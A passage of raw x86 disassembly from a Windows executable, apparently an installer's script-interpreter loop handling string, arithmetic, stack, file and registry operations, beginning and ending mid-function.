  4016d6:	0f 84 7e 12 00 00    	je     0x40295a
  4016dc:	56                   	push   %esi
  4016dd:	e8 2d 52 00 00       	call   0x40690f
  4016e2:	85 c0                	test   %eax,%eax
  4016e4:	0f 84 70 12 00 00    	je     0x40295a
  4016ea:	57                   	push   %edi
  4016eb:	56                   	push   %esi
  4016ec:	e8 81 4c 00 00       	call   0x406372
  4016f1:	6a e4                	push   $0xffffffe4
  4016f3:	e9 25 0c 00 00       	jmp    0x40231d
  4016f8:	53                   	push   %ebx
  4016f9:	e8 d4 16 00 00       	call   0x402dd2
  4016fe:	8b 7d f4             	mov    -0xc(%ebp),%edi
  401701:	8b f0                	mov    %eax,%esi
  401703:	8d 45 08             	lea    0x8(%ebp),%eax
  401706:	50                   	push   %eax
  401707:	57                   	push   %edi
  401708:	68 00 04 00 00       	push   $0x400
  40170d:	56                   	push   %esi
  40170e:	ff 15 e8 80 40 00    	call   *0x4080e8
  401714:	85 c0                	test   %eax,%eax
  401716:	74 24                	je     0x40173c
  401718:	8b 45 08             	mov    0x8(%ebp),%eax
  40171b:	3b c6                	cmp    %esi,%eax
  40171d:	76 27                	jbe    0x401746
  40171f:	66 39 18             	cmp    %bx,(%eax)
  401722:	74 22                	je     0x401746
  401724:	56                   	push   %esi
  401725:	e8 e5 51 00 00       	call   0x40690f
  40172a:	3b c3                	cmp    %ebx,%eax
  40172c:	74 0e                	je     0x40173c
  40172e:	83 c0 2c             	add    $0x2c,%eax
  401731:	50                   	push   %eax
  401732:	ff 75 08             	push   0x8(%ebp)
  401735:	e8 78 4e 00 00       	call   0x4065b2
  40173a:	eb 0a                	jmp    0x401746
  40173c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401743:	66 89 1f             	mov    %bx,(%edi)
  401746:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401749:	0f 85 07 15 00 00    	jne    0x402c56
  40174f:	68 00 04 00 00       	push   $0x400
  401754:	57                   	push   %edi
  401755:	57                   	push   %edi
  401756:	ff 15 ec 80 40 00    	call   *0x4080ec
  40175c:	e9 f5 14 00 00       	jmp    0x402c56
  401761:	6a ff                	push   $0xffffffff
  401763:	e8 6a 16 00 00       	call   0x402dd2
  401768:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40176b:	51                   	push   %ecx
  40176c:	57                   	push   %edi
  40176d:	68 00 04 00 00       	push   $0x400
  401772:	53                   	push   %ebx
  401773:	50                   	push   %eax
  401774:	53                   	push   %ebx
  401775:	ff 15 f0 80 40 00    	call   *0x4080f0
  40177b:	85 c0                	test   %eax,%eax
  40177d:	0f 85 d3 14 00 00    	jne    0x402c56
  401783:	e9 a0 11 00 00       	jmp    0x402928
  401788:	6a ef                	push   $0xffffffef
  40178a:	e8 43 16 00 00       	call   0x402dd2
  40178f:	50                   	push   %eax
  401790:	57                   	push   %edi
  401791:	e8 3b 49 00 00       	call   0x4060d1
  401796:	e9 3e fe ff ff       	jmp    0x4015d9
  40179b:	6a 31                	push   $0x31
  40179d:	e8 30 16 00 00       	call   0x402dd2
  4017a2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4017a5:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4017a8:	ff 75 f8             	push   -0x8(%ebp)
  4017ab:	83 e0 07             	and    $0x7,%eax
  4017ae:	89 45 08             	mov    %eax,0x8(%ebp)
  4017b1:	e8 42 47 00 00       	call   0x405ef8
  4017b6:	ff 75 f8             	push   -0x8(%ebp)
  4017b9:	bf f0 a5 40 00       	mov    $0x40a5f0,%edi
  4017be:	85 c0                	test   %eax,%eax
  4017c0:	74 08                	je     0x4017ca
  4017c2:	57                   	push   %edi
  4017c3:	e8 ea 4d 00 00       	call   0x4065b2
  4017c8:	eb 17                	jmp    0x4017e1
  4017ca:	68 00 00 44 00       	push   $0x440000
  4017cf:	57                   	push   %edi
  4017d0:	e8 dd 4d 00 00       	call   0x4065b2
  4017d5:	50                   	push   %eax
  4017d6:	e8 a6 46 00 00       	call   0x405e81
  4017db:	50                   	push   %eax
  4017dc:	e8 ed 4d 00 00       	call   0x4065ce
  4017e1:	57                   	push   %edi
  4017e2:	e8 79 50 00 00       	call   0x406860
  4017e7:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017eb:	7c 31                	jl     0x40181e
  4017ed:	57                   	push   %edi
  4017ee:	e8 1c 51 00 00       	call   0x40690f
  4017f3:	33 c9                	xor    %ecx,%ecx
  4017f5:	3b c3                	cmp    %ebx,%eax
  4017f7:	74 10                	je     0x401809
  4017f9:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4017fc:	83 c0 14             	add    $0x14,%eax
  4017ff:	51                   	push   %ecx
  401800:	50                   	push   %eax
  401801:	ff 15 f4 80 40 00    	call   *0x4080f4
  401807:	8b c8                	mov    %eax,%ecx
  401809:	8b 45 08             	mov    0x8(%ebp),%eax
  40180c:	83 c0 fd             	add    $0xfffffffd,%eax
  40180f:	0d 00 00 00 80       	or     $0x80000000,%eax
  401814:	23 c1                	and    %ecx,%eax
  401816:	f7 d8                	neg    %eax
  401818:	1b c0                	sbb    %eax,%eax
  40181a:	40                   	inc    %eax
  40181b:	89 45 08             	mov    %eax,0x8(%ebp)
  40181e:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401821:	75 06                	jne    0x401829
  401823:	57                   	push   %edi
  401824:	e8 54 48 00 00       	call   0x40607d
  401829:	33 c0                	xor    %eax,%eax
  40182b:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  40182f:	0f 95 c0             	setne  %al
  401832:	40                   	inc    %eax
  401833:	50                   	push   %eax
  401834:	68 00 00 00 40       	push   $0x40000000
  401839:	57                   	push   %edi
  40183a:	e8 63 48 00 00       	call   0x4060a2
  40183f:	83 f8 ff             	cmp    $0xffffffff,%eax
  401842:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401845:	75 72                	jne    0x4018b9
  401847:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40184a:	75 4f                	jne    0x40189b
  40184c:	56                   	push   %esi
  40184d:	68 f0 b5 40 00       	push   $0x40b5f0
  401852:	e8 5b 4d 00 00       	call   0x4065b2
  401857:	57                   	push   %edi
  401858:	56                   	push   %esi
  401859:	e8 54 4d 00 00       	call   0x4065b2
  40185e:	ff 75 e4             	push   -0x1c(%ebp)
  401861:	68 f0 ad 40 00       	push   $0x40adf0
  401866:	e8 84 4d 00 00       	call   0x4065ef
  40186b:	68 f0 b5 40 00       	push   $0x40b5f0
  401870:	56                   	push   %esi
  401871:	e8 3c 4d 00 00       	call   0x4065b2
  401876:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401879:	c1 f8 03             	sar    $0x3,%eax
  40187c:	50                   	push   %eax
  40187d:	68 f0 ad 40 00       	push   $0x40adf0
  401882:	e8 8b 43 00 00       	call   0x405c12
  401887:	83 e8 04             	sub    $0x4,%eax
  40188a:	0f 84 57 ff ff ff    	je     0x4017e7
  401890:	48                   	dec    %eax
  401891:	74 1b                	je     0x4018ae
  401893:	57                   	push   %edi
  401894:	6a fa                	push   $0xfffffffa
  401896:	e9 f8 fb ff ff       	jmp    0x401493
  40189b:	ff 75 f8             	push   -0x8(%ebp)
  40189e:	6a e2                	push   $0xffffffe2
  4018a0:	e8 92 3d 00 00       	call   0x405637
  4018a5:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4018a9:	e9 2d fd ff ff       	jmp    0x4015db
  4018ae:	ff 05 88 47 43 00    	incl   0x434788
  4018b4:	e9 a6 13 00 00       	jmp    0x402c5f
  4018b9:	ff 75 f8             	push   -0x8(%ebp)
  4018bc:	6a ea                	push   $0xffffffea
  4018be:	e8 74 3d 00 00       	call   0x405637
  4018c3:	ff 05 b4 47 43 00    	incl   0x4347b4
  4018c9:	53                   	push   %ebx
  4018ca:	53                   	push   %ebx
  4018cb:	ff 75 c8             	push   -0x38(%ebp)
  4018ce:	ff 75 d8             	push   -0x28(%ebp)
  4018d1:	e8 3e 1a 00 00       	call   0x403314
  4018d6:	ff 0d b4 47 43 00    	decl   0x4347b4
  4018dc:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%ebp)
  4018e0:	8b f0                	mov    %eax,%esi
  4018e2:	75 06                	jne    0x4018ea
  4018e4:	83 7d e0 ff          	cmpl   $0xffffffff,-0x20(%ebp)
  4018e8:	74 12                	je     0x4018fc
  4018ea:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018ed:	50                   	push   %eax
  4018ee:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018f1:	53                   	push   %ebx
  4018f2:	50                   	push   %eax
  4018f3:	ff 75 c8             	push   -0x38(%ebp)
  4018f6:	ff 15 f8 80 40 00    	call   *0x4080f8
  4018fc:	ff 75 c8             	push   -0x38(%ebp)
  4018ff:	ff 15 fc 80 40 00    	call   *0x4080fc
  401905:	3b f3                	cmp    %ebx,%esi
  401907:	0f 8d 49 13 00 00    	jge    0x402c56
  40190d:	83 fe fe             	cmp    $0xfffffffe,%esi
  401910:	75 13                	jne    0x401925
  401912:	6a e9                	push   $0xffffffe9
  401914:	57                   	push   %edi
  401915:	e8 d5 4c 00 00       	call   0x4065ef
  40191a:	ff 75 f8             	push   -0x8(%ebp)
  40191d:	57                   	push   %edi
  40191e:	e8 ab 4c 00 00       	call   0x4065ce
  401923:	eb 08                	jmp    0x40192d
  401925:	6a ee                	push   $0xffffffee
  401927:	57                   	push   %edi
  401928:	e8 c2 4c 00 00       	call   0x4065ef
  40192d:	68 10 00 20 00       	push   $0x200010
  401932:	57                   	push   %edi
  401933:	e9 8c 0a 00 00       	jmp    0x4023c4
  401938:	53                   	push   %ebx
  401939:	eb 34                	jmp    0x40196f
  40193b:	6a 31                	push   $0x31
  40193d:	e8 90 14 00 00       	call   0x402dd2
  401942:	ff 75 d0             	push   -0x30(%ebp)
  401945:	50                   	push   %eax
  401946:	e8 c7 42 00 00       	call   0x405c12
  40194b:	3b c3                	cmp    %ebx,%eax
  40194d:	0f 84 07 10 00 00    	je     0x40295a
  401953:	3b 45 d8             	cmp    -0x28(%ebp),%eax
  401956:	0f 84 6c 01 00 00    	je     0x401ac8
  40195c:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  40195f:	0f 85 f1 12 00 00    	jne    0x402c56
  401965:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401968:	e9 f4 12 00 00       	jmp    0x402c61
  40196d:	6a f0                	push   $0xfffffff0
  40196f:	e8 5e 14 00 00       	call   0x402dd2
  401974:	ff 75 d4             	push   -0x2c(%ebp)
  401977:	50                   	push   %eax
  401978:	e8 41 43 00 00       	call   0x405cbe
  40197d:	e9 d4 12 00 00       	jmp    0x402c56
  401982:	6a 01                	push   $0x1
  401984:	e8 49 14 00 00       	call   0x402dd2
  401989:	50                   	push   %eax
  40198a:	e8 39 4c 00 00       	call   0x4065c8
  40198f:	e9 d0 0c 00 00       	jmp    0x402664
  401994:	6a 02                	push   $0x2
  401996:	e8 15 14 00 00       	call   0x402db0
  40199b:	6a 03                	push   $0x3
  40199d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4019a0:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4019a3:	e8 08 14 00 00       	call   0x402db0
  4019a8:	59                   	pop    %ecx
  4019a9:	8b f0                	mov    %eax,%esi
  4019ab:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4019ae:	59                   	pop    %ecx
  4019af:	6a 01                	push   $0x1
  4019b1:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  4019b4:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4019b7:	89 45 08             	mov    %eax,0x8(%ebp)
  4019ba:	e8 13 14 00 00       	call   0x402dd2
  4019bf:	50                   	push   %eax
  4019c0:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4019c3:	e8 00 4c 00 00       	call   0x4065c8
  4019c8:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  4019cb:	66 89 1f             	mov    %bx,(%edi)
  4019ce:	75 03                	jne    0x4019d3
  4019d0:	89 45 08             	mov    %eax,0x8(%ebp)
  4019d3:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019d6:	0f 84 7a 12 00 00    	je     0x402c56
  4019dc:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4019df:	3b cb                	cmp    %ebx,%ecx
  4019e1:	7d 0b                	jge    0x4019ee
  4019e3:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  4019e6:	3b f3                	cmp    %ebx,%esi
  4019e8:	0f 8c 68 12 00 00    	jl     0x402c56
  4019ee:	3b f0                	cmp    %eax,%esi
  4019f0:	7e 02                	jle    0x4019f4
  4019f2:	8b f0                	mov    %eax,%esi
  4019f4:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4019f7:	8d 04 70             	lea    (%eax,%esi,2),%eax
  4019fa:	50                   	push   %eax
  4019fb:	57                   	push   %edi
  4019fc:	e8 b1 4b 00 00       	call   0x4065b2
  401a01:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401a04:	7d 0e                	jge    0x401a14
  401a06:	57                   	push   %edi
  401a07:	e8 bc 4b 00 00       	call   0x4065c8
  401a0c:	01 45 08             	add    %eax,0x8(%ebp)
  401a0f:	79 03                	jns    0x401a14
  401a11:	89 5d 08             	mov    %ebx,0x8(%ebp)
  401a14:	8b 45 08             	mov    0x8(%ebp),%eax
  401a17:	3d 00 04 00 00       	cmp    $0x400,%eax
  401a1c:	0f 8d 34 12 00 00    	jge    0x402c56
  401a22:	66 89 1c 47          	mov    %bx,(%edi,%eax,2)
  401a26:	e9 2b 12 00 00       	jmp    0x402c56
  401a2b:	6a 20                	push   $0x20
  401a2d:	e8 a0 13 00 00       	call   0x402dd2
  401a32:	6a 31                	push   $0x31
  401a34:	8b f0                	mov    %eax,%esi
  401a36:	e8 97 13 00 00       	call   0x402dd2
  401a3b:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401a3e:	50                   	push   %eax
  401a3f:	56                   	push   %esi
  401a40:	75 12                	jne    0x401a54
  401a42:	ff 15 00 81 40 00    	call   *0x408100
  401a48:	85 c0                	test   %eax,%eax
  401a4a:	75 7c                	jne    0x401ac8
  401a4c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401a4f:	e9 0d 12 00 00       	jmp    0x402c61
  401a54:	ff 15 04 81 40 00    	call   *0x408104
  401a5a:	eb ec                	jmp    0x401a48
  401a5c:	33 f6                	xor    %esi,%esi
  401a5e:	46                   	inc    %esi
  401a5f:	56                   	push   %esi
  401a60:	e8 6d 13 00 00       	call   0x402dd2
  401a65:	68 00 04 00 00       	push   $0x400
  401a6a:	57                   	push   %edi
  401a6b:	50                   	push   %eax
  401a6c:	89 45 08             	mov    %eax,0x8(%ebp)
  401a6f:	ff 15 08 81 40 00    	call   *0x408108
  401a75:	85 c0                	test   %eax,%eax
  401a77:	74 13                	je     0x401a8c
  401a79:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401a7c:	74 14                	je     0x401a92
  401a7e:	57                   	push   %edi
  401a7f:	ff 75 08             	push   0x8(%ebp)
  401a82:	ff 15 04 81 40 00    	call   *0x408104
  401a88:	85 c0                	test   %eax,%eax
  401a8a:	75 06                	jne    0x401a92
  401a8c:	89 75 fc             	mov    %esi,-0x4(%ebp)
  401a8f:	66 89 1f             	mov    %bx,(%edi)
  401a92:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  401a99:	e9 b8 11 00 00       	jmp    0x402c56
  401a9e:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  401aa1:	53                   	push   %ebx
  401aa2:	e8 09 13 00 00       	call   0x402db0
  401aa7:	6a 01                	push   $0x1
  401aa9:	8b f8                	mov    %eax,%edi
  401aab:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aae:	e8 fd 12 00 00       	call   0x402db0
  401ab3:	59                   	pop    %ecx
  401ab4:	3b f3                	cmp    %ebx,%esi
  401ab6:	59                   	pop    %ecx
  401ab7:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aba:	75 08                	jne    0x401ac4
  401abc:	3b f8                	cmp    %eax,%edi
  401abe:	7c 08                	jl     0x401ac8
  401ac0:	7e 8a                	jle    0x401a4c
  401ac2:	eb 12                	jmp    0x401ad6
  401ac4:	3b f8                	cmp    %eax,%edi
  401ac6:	73 08                	jae    0x401ad0
  401ac8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401acb:	e9 91 11 00 00       	jmp    0x402c61
  401ad0:	0f 86 76 ff ff ff    	jbe    0x401a4c
  401ad6:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401ad9:	e9 83 11 00 00       	jmp    0x402c61
  401ade:	6a 01                	push   $0x1
  401ae0:	e8 cb 12 00 00       	call   0x402db0
  401ae5:	8b f0                	mov    %eax,%esi
  401ae7:	6a 02                	push   $0x2
  401ae9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aec:	89 75 08             	mov    %esi,0x8(%ebp)
  401aef:	e8 bc 12 00 00       	call   0x402db0
  401af4:	59                   	pop    %ecx
  401af5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401af8:	59                   	pop    %ecx
  401af9:	8b c8                	mov    %eax,%ecx
  401afb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401afe:	83 f8 0d             	cmp    $0xd,%eax
  401b01:	0f 87 94 00 00 00    	ja     0x401b9b
  401b07:	ff 24 85 78 2d 40 00 	jmp    *0x402d78(,%eax,4)
  401b0e:	03 f1                	add    %ecx,%esi
  401b10:	e9 5f 03 00 00       	jmp    0x401e74
  401b15:	2b f1                	sub    %ecx,%esi
  401b17:	e9 58 03 00 00       	jmp    0x401e74
  401b1c:	0f af ce             	imul   %esi,%ecx
  401b1f:	eb 1a                	jmp    0x401b3b
  401b21:	3b cb                	cmp    %ebx,%ecx
  401b23:	74 53                	je     0x401b78
  401b25:	8b c6                	mov    %esi,%eax
  401b27:	99                   	cltd
  401b28:	f7 f9                	idiv   %ecx
  401b2a:	8b f0                	mov    %eax,%esi
  401b2c:	e9 43 03 00 00       	jmp    0x401e74
  401b31:	0b ce                	or     %esi,%ecx
  401b33:	eb 06                	jmp    0x401b3b
  401b35:	23 ce                	and    %esi,%ecx
  401b37:	eb 02                	jmp    0x401b3b
  401b39:	33 ce                	xor    %esi,%ecx
  401b3b:	8b f1                	mov    %ecx,%esi
  401b3d:	e9 32 03 00 00       	jmp    0x401e74
  401b42:	33 c0                	xor    %eax,%eax
  401b44:	3b f3                	cmp    %ebx,%esi
  401b46:	0f 94 c0             	sete   %al
  401b49:	eb df                	jmp    0x401b2a
  401b4b:	3b f3                	cmp    %ebx,%esi
  401b4d:	75 11                	jne    0x401b60
  401b4f:	eb 0b                	jmp    0x401b5c
  401b51:	33 f6                	xor    %esi,%esi
  401b53:	e9 1c 03 00 00       	jmp    0x401e74
  401b58:	3b f3                	cmp    %ebx,%esi
  401b5a:	74 f5                	je     0x401b51
  401b5c:	3b cb                	cmp    %ebx,%ecx
  401b5e:	74 f1                	je     0x401b51
  401b60:	33 f6                	xor    %esi,%esi
  401b62:	46                   	inc    %esi
  401b63:	e9 0c 03 00 00       	jmp    0x401e74
  401b68:	3b cb                	cmp    %ebx,%ecx
  401b6a:	74 0c                	je     0x401b78
  401b6c:	8b c6                	mov    %esi,%eax
  401b6e:	99                   	cltd
  401b6f:	f7 f9                	idiv   %ecx
  401b71:	8b f2                	mov    %edx,%esi
  401b73:	e9 fc 02 00 00       	jmp    0x401e74
  401b78:	33 f6                	xor    %esi,%esi
  401b7a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b81:	e9 ee 02 00 00       	jmp    0x401e74
  401b86:	d3 e6                	shl    %cl,%esi
  401b88:	e9 e7 02 00 00       	jmp    0x401e74
  401b8d:	d3 fe                	sar    %cl,%esi
  401b8f:	e9 e0 02 00 00       	jmp    0x401e74
  401b94:	d3 ee                	shr    %cl,%esi
  401b96:	e9 d9 02 00 00       	jmp    0x401e74
  401b9b:	8b 75 08             	mov    0x8(%ebp),%esi
  401b9e:	e9 d1 02 00 00       	jmp    0x401e74
  401ba3:	6a 01                	push   $0x1
  401ba5:	e8 28 12 00 00       	call   0x402dd2
  401baa:	6a 02                	push   $0x2
  401bac:	8b f0                	mov    %eax,%esi
  401bae:	e8 fd 11 00 00       	call   0x402db0
  401bb3:	50                   	push   %eax
  401bb4:	56                   	push   %esi
  401bb5:	57                   	push   %edi
  401bb6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401bb9:	ff 15 2c 82 40 00    	call   *0x40822c
  401bbf:	83 c4 10             	add    $0x10,%esp
  401bc2:	e9 8f 10 00 00       	jmp    0x402c56
  401bc7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401bca:	8b 35 50 ce 40 00    	mov    0x40ce50,%esi
  401bd0:	3b c3                	cmp    %ebx,%eax
  401bd2:	74 44                	je     0x401c18
  401bd4:	48                   	dec    %eax
  401bd5:	3b f3                	cmp    %ebx,%esi
  401bd7:	0f 84 d9 07 00 00    	je     0x4023b6
  401bdd:	8b 36                	mov    (%esi),%esi
  401bdf:	3b c3                	cmp    %ebx,%eax
  401be1:	75 f1                	jne    0x401bd4
  401be3:	3b f3                	cmp    %ebx,%esi
  401be5:	0f 84 cb 07 00 00    	je     0x4023b6
  401beb:	83 c6 04             	add    $0x4,%esi
  401bee:	bf f0 a5 40 00       	mov    $0x40a5f0,%edi
  401bf3:	56                   	push   %esi
  401bf4:	57                   	push   %edi
  401bf5:	e8 b8 49 00 00       	call   0x4065b2
  401bfa:	a1 50 ce 40 00       	mov    0x40ce50,%eax
  401bff:	83 c0 04             	add    $0x4,%eax
  401c02:	50                   	push   %eax
  401c03:	56                   	push   %esi
  401c04:	e8 a9 49 00 00       	call   0x4065b2
  401c09:	a1 50 ce 40 00       	mov    0x40ce50,%eax
  401c0e:	57                   	push   %edi
  401c0f:	83 c0 04             	add    $0x4,%eax
  401c12:	50                   	push   %eax
  401c13:	e9 a8 0e 00 00       	jmp    0x402ac0
  401c18:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401c1b:	74 25                	je     0x401c42
  401c1d:	3b f3                	cmp    %ebx,%esi
  401c1f:	0f 84 35 0d 00 00    	je     0x40295a
  401c25:	8d 46 04             	lea    0x4(%esi),%eax
  401c28:	50                   	push   %eax
  401c29:	57                   	push   %edi
  401c2a:	e8 83 49 00 00       	call   0x4065b2
  401c2f:	8b 06                	mov    (%esi),%eax
  401c31:	56                   	push   %esi
  401c32:	a3 50 ce 40 00       	mov    %eax,0x40ce50
  401c37:	ff 15 0c 81 40 00    	call   *0x40810c
  401c3d:	e9 14 10 00 00       	jmp    0x402c56
  401c42:	68 04 08 00 00       	push   $0x804
  401c47:	6a 40                	push   $0x40
  401c49:	ff 15 10 81 40 00    	call   *0x408110
  401c4f:	ff 75 d0             	push   -0x30(%ebp)
  401c52:	8b f0                	mov    %eax,%esi
  401c54:	8d 46 04             	lea    0x4(%esi),%eax
  401c57:	50                   	push   %eax
  401c58:	e8 92 49 00 00       	call   0x4065ef
  401c5d:	a1 50 ce 40 00       	mov    0x40ce50,%eax
  401c62:	89 06                	mov    %eax,(%esi)
  401c64:	89 35 50 ce 40 00    	mov    %esi,0x40ce50
  401c6a:	e9 e7 0f 00 00       	jmp    0x402c56
  401c6f:	6a 03                	push   $0x3
  401c71:	e8 3a 11 00 00       	call   0x402db0
  401c76:	6a 04                	push   $0x4
  401c78:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c7b:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c7e:	e8 2d 11 00 00       	call   0x402db0
  401c83:	f6 45 e4 01          	testb  $0x1,-0x1c(%ebp)
  401c87:	59                   	pop    %ecx
  401c88:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c8b:	59                   	pop    %ecx
  401c8c:	89 45 08             	mov    %eax,0x8(%ebp)
  401c8f:	74 0a                	je     0x401c9b
  401c91:	6a 33                	push   $0x33
  401c93:	e8 3a 11 00 00       	call   0x402dd2
  401c98:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c9b:	f6 45 e4 02          	testb  $0x2,-0x1c(%ebp)
  401c9f:	74 0a                	je     0x401cab
  401ca1:	6a 44                	push   $0x44
  401ca3:	e8 2a 11 00 00       	call   0x402dd2
  401ca8:	89 45 08             	mov    %eax,0x8(%ebp)
  401cab:	83 7d cc 21          	cmpl   $0x21,-0x34(%ebp)
  401caf:	6a 01                	push   $0x1
  401cb1:	75 4c                	jne    0x401cff
  401cb3:	e8 f8 10 00 00       	call   0x402db0
  401cb8:	6a 02                	push   $0x2
  401cba:	8b f0                	mov    %eax,%esi
  401cbc:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401cbf:	e8 ec 10 00 00       	call   0x402db0
  401cc4:	59                   	pop    %ecx
  401cc5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401cc8:	59                   	pop    %ecx
  401cc9:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401ccc:	c1 f9 02             	sar    $0x2,%ecx
  401ccf:	74 1e                	je     0x401cef
  401cd1:	8d 55 c8             	lea    -0x38(%ebp),%edx
  401cd4:	52                   	push   %edx
  401cd5:	51                   	push   %ecx
  401cd6:	53                   	push   %ebx
  401cd7:	ff 75 08             	push   0x8(%ebp)
  401cda:	ff 75 e8             	push   -0x18(%ebp)
  401cdd:	50                   	push   %eax
  401cde:	56                   	push   %esi
  401cdf:	ff 15 30 82 40 00    	call   *0x408230
  401ce5:	f7 d8                	neg    %eax
  401ce7:	1b c0                	sbb    %eax,%eax
  401ce9:	40                   	inc    %eax
  401cea:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ced:	eb 43                	jmp    0x401d32
  401cef:	ff 75 08             	push   0x8(%ebp)
  401cf2:	ff 75 e8             	push   -0x18(%ebp)
  401cf5:	50                   	push   %eax
  401cf6:	56                   	push   %esi
  401cf7:	ff 15 58 82 40 00    	call   *0x408258
  401cfd:	eb 30                	jmp    0x401d2f
  401cff:	e8 ce 10 00 00       	call   0x402dd2
  401d04:	6a 12                	push   $0x12
  401d06:	8b f0                	mov    %eax,%esi
  401d08:	e8 c5 10 00 00       	call   0x402dd2
  401d0d:	66 8b 08             	mov    (%eax),%cx
  401d10:	66 f7 d9             	neg    %cx
  401d13:	1b c9                	sbb    %ecx,%ecx
  401d15:	23 c8                	and    %eax,%ecx
  401d17:	66 8b 06             	mov    (%esi),%ax
  401d1a:	66 f7 d8             	neg    %ax
  401d1d:	1b c0                	sbb    %eax,%eax
  401d1f:	51                   	push   %ecx
  401d20:	23 c6                	and    %esi,%eax
  401d22:	50                   	push   %eax
  401d23:	ff 75 08             	push   0x8(%ebp)
  401d26:	ff 75 e8             	push   -0x18(%ebp)
  401d29:	ff 15 34 82 40 00    	call   *0x408234
  401d2f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401d32:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401d35:	0f 8c 1b 0f 00 00    	jl     0x402c56
  401d3b:	ff 75 c8             	push   -0x38(%ebp)
  401d3e:	e9 4f f8 ff ff       	jmp    0x401592
  401d43:	53                   	push   %ebx
  401d44:	e8 67 10 00 00       	call   0x402db0
  401d49:	59                   	pop    %ecx
  401d4a:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d4d:	50                   	push   %eax
  401d4e:	ff 15 38 82 40 00    	call   *0x408238
  401d54:	85 c0                	test   %eax,%eax
  401d56:	0f 84 f0 fc ff ff    	je     0x401a4c
  401d5c:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401d5f:	e9 fd 0e 00 00       	jmp    0x402c61
  401d64:	6a 02                	push   $0x2
  401d66:	e8 45 10 00 00       	call   0x402db0
  401d6b:	6a 01                	push   $0x1
  401d6d:	8b f0                	mov    %eax,%esi
  401d6f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d72:	e8 39 10 00 00       	call   0x402db0
  401d77:	59                   	pop    %ecx
  401d78:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d7b:	59                   	pop    %ecx
  401d7c:	56                   	push   %esi
  401d7d:	50                   	push   %eax
  401d7e:	ff 15 3c 82 40 00    	call   *0x40823c
  401d84:	e9 db 08 00 00       	jmp    0x402664
  401d89:	a1 48 47 43 00       	mov    0x434748,%eax
  401d8e:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401d91:	53                   	push   %ebx
  401d92:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  401d95:	e8 16 10 00 00       	call   0x402db0
  401d9a:	59                   	pop    %ecx
  401d9b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d9e:	56                   	push   %esi
  401d9f:	6a eb                	push   $0xffffffeb
  401da1:	50                   	push   %eax
  401da2:	ff 15 40 82 40 00    	call   *0x408240
  401da8:	e9 a9 0e 00 00       	jmp    0x402c56
  401dad:	f6 45 dd 01          	testb  $0x1,-0x23(%ebp)
  401db1:	74 0d                	je     0x401dc0
  401db3:	6a 02                	push   $0x2
  401db5:	e8 f6 0f 00 00       	call   0x402db0
  401dba:	59                   	pop    %ecx
  401dbb:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401dbe:	eb 0c                	jmp    0x401dcc
  401dc0:	ff 75 d8             	push   -0x28(%ebp)
  401dc3:	ff 75 f8             	push   -0x8(%ebp)
  401dc6:	ff 15 3c 82 40 00    	call   *0x40823c
  401dcc:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401dcf:	89 45 08             	mov    %eax,0x8(%ebp)
  401dd2:	8b c1                	mov    %ecx,%eax
  401dd4:	8b f1                	mov    %ecx,%esi
